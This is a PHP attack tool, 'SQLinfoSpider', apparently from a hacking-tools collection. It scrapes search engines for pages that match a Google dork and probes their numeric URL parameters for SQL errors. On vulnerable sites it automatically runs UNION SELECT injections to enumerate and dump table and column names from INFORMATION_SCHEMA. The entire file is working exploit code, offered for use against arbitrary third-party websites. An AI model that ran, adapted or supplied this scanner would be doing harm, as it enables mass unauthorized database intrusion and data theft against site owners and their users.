http://localhost/tools/Hack-Shop/Google-Dork/index.php?dork=[google_dork]

	<link rel="stylesheet" type="text/css" href="../../../css/default1.css" />
	
<?php


/**
 * SQLinfoSpider by zbt - zabeaty at gmail.com
 *
 * @Source:  http://www.zbt.mtvk.pl/code/sinfo.php.txt
 * @Usage:   http://owner.net/sinfo.php?dork=[google_dork]
 * @Example: http://owner.net/sinfo.php?dork=inurl:odpoved.php
 * @PoC:     http://www.youtube.com/watch?v=ZSFNRahKrMY
 */


@ini_restore();
@ini_set('default_socket_timeout', 3);
@set_time_limit(0);
@error_reporting(0);
//@ignore_user_abort();


$SEARCH = array
(
    'google' => array
        (
            'url'    => 'http://www.google.com/search?q={DORK}&start={PAGE}',
            'add'    => 10,
            'limit'  => 20,
            'regexp' => '!<a href="([^ ]+)" class=l!sei'
        ),

    'yahoo' => array
        (
            'url'    => 'http://search.yahoo.com/search?ei=UTF-8&p={DORK}&n=100&fr=sfp&b={PAGE}',
            'add'    => 100,
            'limit'  => 1000,
            'regexp' => '!class="yschttl" href="([^"]+)"!sei'
        ),
    
    'alltheweb' => array
        (
            'url'    => 'http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q={DORK}&o={PAGE}',
            'add'    => 100,
            'limit'  => 1000,
            'regexp' => '!<span class="resURL">http://([^<]+)</span>!sei'
        ),
    
    'msn' => array
        (
            'url'    => 'http://search.live.com/results.aspx?q={DORK}&first={PAGE}',
            'add'    => 100,
            'limit'  => 1000,
            'regexp' => '!<a href="http://([^"]+)" !sei'
        ),
    
    'busca' => array
        (
            'url'    => 'http://busca.uol.com.br/www/index.html?q={DORK}&start={PAGE}',
            'add'    => 100,
            'limit'  => 2000,
            'regexp' => '!<a href="http://([^"]+)"!sei'
        ),
    
    'alice' => array
        (
            'url'    => 'http://search.alice.it/search/cgi/search.cgi?f=hp&offset={PAGE}&hits=10&qs={DORK}',
            'add'    => 10,
            'limit'  => 1000,
            'regexp' => '!<a href="http://([^"]+)"!sei'
        ),
            
    'fireball' => array
        (
            'url'    => 'http://suche.fireball.de/cgi-bin/pursuit?pag={PAGE}&query={DORK}&cat=fb_loc&idx=all&enc=utf-8',
            'add'    => 10,
            'limit'  => 200,
            'regexp' => '!<a href="http://([^"]+)"!sei'
        ),
);







class SQLinfoSpider
{
    private $dork;
    private $needFoo;
    private $hosts;
    private $signature;
    
    public function __construct()
    {
        $this -> needFoo    = array('default_socket_timeout', 'file_get_contents', 'set_time_limit');
        $this -> signature  = array('sql syntax', 'valid mysql result');
        $this -> hosts      = array();
        

        if(!empty($_GET['dork']))
        {
            $this -> dork = urlencode($_GET['dork']);
            
            $this -> run();
        }
        
        else $this -> allReady();
    }
    
    
    
    private function allReady()
    {
        echo php_uname();
        
        foreach($this -> needFoo as $no => $foo) 
            if(!function_exists($foo))
                echo ' - Need function ' . $foo . ' to run, sry :(' and exit;
            
        echo ' - Ready';
    }
    
    
    
    
    private function tryExploit($url)
    {
        echo "\r\n\r\n[+] SQL: <a href=\"$url\" target=\"_blank\">$url</a>\r\n   [+] Trying exploit\r\n";
        flush();
        
        $block  = '0x3a3a3a3a';
        $sep    = '0x207c20';
        $find   = '95,95,83,81,76,95,95'; // __SQL__
        
        if(in_array(parse_url($url, PHP_URL_HOST), $this -> hosts)) return;
        else $this -> hosts[] = parse_url($url, PHP_URL_HOST);
        
        if(preg_match_all('!([a-z]+)=([0-9]+)\'!si', $url, $part)) foreach($part[1] as $no => $var) 
        {
            $key   = $var;
            $value = $part[2][$no];
            
            for($i = 1; $i <= 35; $i++)
            {
                $cols = array();
            
                for($a = 0; $a < $i; $a++) $cols[] = 'concat(char(' . $find . '),' . ($a + 1) . ')'; // __SQL__1-35
                
                $inj  = '-1+UNION+SELECT+' . implode(',', $cols) . '--';
                $link = str_replace('\'', '', $url);
                $link = str_replace($key . '=' . $value, $key . '=' . $inj, $link);
                
                echo '. ';
                flush();
                
                if(!$code = @file_get_contents($link)) break;
            
                if(preg_match('!__SQL__([0-9]+)!s', $code, $no))
                {
                    $display    = (int)$no[1];
                    $injection  = $inj;                    
                    $inj = $bug = '-1+UNION+SELECT+';
                
                    for($a = 1; $a <= $i; $a++)
                    {
                        if($a == $display)
                        {
                            $inj .= 'NOW(),';
                            $bug .= 'CONCAT(' . $block . ',columns.table_name,' . $sep . ',columns.column_name,' . $block . '),';
                        }
                    
                        else 
                        {
                            $inj .= $a . ',';
                            $bug .= $a . ',';
                        }
                    }
                
                    $inj = substr($inj, 0, -1) . '--';
                    $bug = substr($bug, 0, -1) . '+FROM+INFORMATION_SCHEMA.columns+LIMIT+150,1--';
                
                    $msg  = str_replace($injection, $inj, $link);
                    $url  = str_replace($injection, $bug, $link);
                    $code = @file_get_contents($url);
                
                    if(preg_match('!::::([^::::]+)::::!si', $code, $response))
                    {
                        echo "\r\n[+] <a href=\"$url\" target=\"_blank\">Download INFORMATION_SCHEMA.columns</a>\r\n";
                        flush();
                        
                        $data   = array();
                        $tables = array();
                        
                        for($a = 151 ;; $a++)
                        {
                            $link = strtr($url, array('150,1--' => $a . ',1--'));
                            $code = file_get_contents($link);
                        
                            if(preg_match('!::::([^::::]+)::::!', $code, $response))
                            {
                                list($table, $column) = explode(' | ', $response[1]);
                                
                                if(!in_array($table, $tables))
                                {
                                    $tables[] = $table;
                                    echo "\r\n<b>$table</b>: ";
                                }
                                
                                else echo "$column | ";
                                
                                $data[$table][] = $column;
                                
                                flush();
                            }
                        
                            else
                            {
                                echo "\n\nINFORMATION_SCHEMA.columns \n\n" . print_r($data, true) . "\r\n\r\n";
                            
                                //foreach($data as $table => $columns) $msg .= $table . ' : ' . implode(' | ', $columns) . "\r\n";

                                flush();
                            
                                return true;
                            }
                        }
                    } // if(preg_match('!::::([^::::]+)::::!si', $code, $response))
                    
                    break;
                    
                } // if(preg_match('!__SQL__([0-9]+)!s', $code, $no))
                
                else continue;
                
            } // for($i = 1; $i <= 35; $i++)
        }
        
        else return false; // Bad url
    }
    
    
    
    
    
    
    private function run()
    {
        global $SEARCH;

        foreach($SEARCH as $engine => $data) for($i = 0; $i < $data['limit']; $i += $data['add'])
        {
            $url     = strtr($data['url'], array('{PAGE}' => $i, '{DORK}' => $this -> dork));
            $source  = @file_get_contents($url);
            
            if(preg_match_all($data['regexp'], $source, $result)) foreach($result[1] as $no => $link)
            {
                $parse = parse_url($link);
                
                if(empty($parse['query'])) continue;
                
                $query  = preg_replace('!\=([0-9]+)!', "=\\1'", $parse['query']);
                $url    = trim("http://{$parse['host']}{$parse['path']}?$query");
                
                if(($source = @file_get_contents($url)))
                {
                    echo "\r\n[*] Checking $url";
                    
                    foreach($this -> signature as $no => $sig) 
                        if(stristr($source, $sig)) $this -> tryExploit($url);
                
                    flush();
                }
            }
            
            else break;
        }
        
    }
}

new SQLinfoSpider();

?>